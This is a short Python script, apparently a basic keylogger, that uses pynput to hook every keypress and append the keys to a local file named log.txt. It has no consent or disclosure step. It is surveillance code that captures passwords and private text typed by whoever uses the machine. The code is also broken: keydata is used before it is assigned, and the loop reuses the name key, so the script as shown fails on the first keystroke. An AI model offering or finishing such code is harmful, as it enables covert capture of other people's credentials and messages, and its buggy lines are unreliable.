from pynput.keyboard import Listener

logfile = "log.txt" 

def writelog(key):
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
    }

    keydata = keydata.replace("'", "")

    keydata = str(key)

    for key in translate_keys:

        keydata = keydata.replace(key, translate_keys[key])

    with open(logfile, "a") as f:
        f.write(keydata)
with Listener(on_press=writelog) as l:
    l.join()
